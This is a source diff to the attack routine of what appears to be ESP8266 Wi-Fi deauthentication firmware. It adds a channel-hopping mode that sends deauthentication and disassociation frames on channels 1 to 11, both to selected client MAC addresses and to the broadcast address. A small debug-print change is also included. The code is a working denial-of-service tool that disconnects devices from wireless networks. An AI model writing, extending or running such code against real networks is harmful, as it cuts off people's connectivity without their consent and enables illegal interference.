@@ -135,23 +135,47 @@ void Attack::run(){
           if(clientScan.getClientSelected(i)){
             _selectedClients++;
 
-            buildDeauth(_ap, clientScan.getClientMac(i), 0xc0, settings.deauthReason );
-            for(int h=0;h<settings.attackPacketRate;h++) if(send()) packetsCounter[0]++;
-            
-            buildDeauth(_ap, clientScan.getClientMac(i), 0xa0, settings.deauthReason );
-            for(int h=0;h<settings.attackPacketRate;h++) if(send()) packetsCounter[0]++;
-            
+            if(settings.channelHop){
+              for(int j=1;j<12;j++){
+                wifi_set_channel(j);
+                
+                buildDeauth(_ap, clientScan.getClientMac(i), 0xc0, settings.deauthReason );
+                if(send()) packetsCounter[0]++;
+                
+                buildDeauth(_ap, clientScan.getClientMac(i), 0xa0, settings.deauthReason );
+                if(send()) packetsCounter[0]++;
+              }
+            }else{
+              buildDeauth(_ap, clientScan.getClientMac(i), 0xc0, settings.deauthReason );
+              for(int h=0;h<settings.attackPacketRate;h++) if(send()) packetsCounter[0]++;
+              
+              buildDeauth(_ap, clientScan.getClientMac(i), 0xa0, settings.deauthReason );
+              for(int h=0;h<settings.attackPacketRate;h++) if(send()) packetsCounter[0]++;
+            }
           }
         }
         
         if(_selectedClients == 0){
           Mac _client;
           _client.set(0xFF,0xFF,0xFF,0xFF,0xFF,0xFF);
-          buildDeauth(_ap, _client, 0xc0, 0x01 );
-          for(int h=0;h<settings.attackPacketRate;h++) if(send()) packetsCounter[0]++;
-            
-          buildDeauth(_ap, _client, 0xa0, 0x01 );
-          for(int h=0;h<settings.attackPacketRate;h++) if(send()) packetsCounter[0]++;
+
+          if(settings.channelHop){
+              for(int j=1;j<12;j++){
+                wifi_set_channel(j);
+
+                buildDeauth(_ap, _client, 0xc0, settings.deauthReason );
+                if(send()) packetsCounter[0]++;
+                
+                buildDeauth(_ap, _client, 0xa0, settings.deauthReason );
+                if(send()) packetsCounter[0]++;
+              }
+            }else{
+              buildDeauth(_ap, _client, 0xc0, settings.deauthReason );
+              for(int h=0;h<settings.attackPacketRate;h++) if(send()) packetsCounter[0]++;
+              
+              buildDeauth(_ap, _client, 0xa0, settings.deauthReason );
+              for(int h=0;h<settings.attackPacketRate;h++) if(send()) packetsCounter[0]++;
+            }
         }
         
       } 
@@ -370,7 +394,7 @@ void Attack::refreshLed(){
    int numberRunning = 0;
    for(int i=0; i<sizeof(isRunning); i++){
     if(isRunning[i]) numberRunning++;
-    if(debug) Serial.println(numberRunning);
+    //if(debug) Serial.println(numberRunning);
    }
   if(numberRunning>=1 && settings.useLed){
     if(debug) Serial.println("Attack LED : ON");
